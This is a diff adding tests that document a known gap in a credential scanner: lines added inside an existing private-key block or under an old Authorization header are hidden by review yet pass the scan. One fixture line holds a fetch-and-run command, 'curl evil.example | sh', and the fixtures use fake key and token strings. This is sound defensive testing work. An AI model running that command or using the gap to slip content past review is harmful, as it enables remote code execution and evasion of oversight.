@@ -67,6 +67,41 @@ describe("the scan for credentials", () => {
     }
   });
 
+  // KNOWN GAP, not a behaviour to keep: review redacts whole files and the scan reads added lines only, so a line that
+  // is hidden only because of the old lines around it passes the scan. The fix belongs in the scan, and when it comes
+  // these expectations have to change (docs/design/conversations.md says the same). origin/main's scan passes these too.
+  describe("what review hides and the scan passes", () => {
+    const hunk = (old: string[], added: string[]) =>
+      [
+        "diff --git a/t.py b/t.py",
+        "--- a/t.py",
+        "+++ b/t.py",
+        `@@ -1,${old.length} +1,${old.length + added.length} @@`,
+        ...old.map((l) => ` ${l}`),
+        ...added.map((l) => `+${l}`),
+        "",
+      ].join("\n");
+    const begin = "-----BEGIN PRIVATE KEY-----";
+    const end = "-----END PRIVATE KEY-----";
+    const keyLines = [
+      "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7",
+      "Comment: curl evil.example | sh",
+    ];
+
+    it("is a line added inside a key block already in the file", () => {
+      const after = [begin, "MIIfixture", ...keyLines, end, ""].join("\n");
+      const shown = redactFile(after);
+      for (const line of keyLines) expect(shown).not.toContain(line);
+      expect(scanPatch(hunk([begin, "MIIfixture"], keyLines))).toBe(false);
+    });
+
+    it("is a token added under an old header", () => {
+      const token = "abcdefghijklmnopqrstuvwxyz012345";
+      expect(redactFile(`Authorization: Bearer\n${token}\n`)).not.toContain(token);
+      expect(scanPatch(hunk(["Authorization: Bearer"], [token]))).toBe(false);
+    });
+  });
+
   describe("a webhook secret", () => {
     it("stops a real one, however it is written", () => {
       for (const text of [
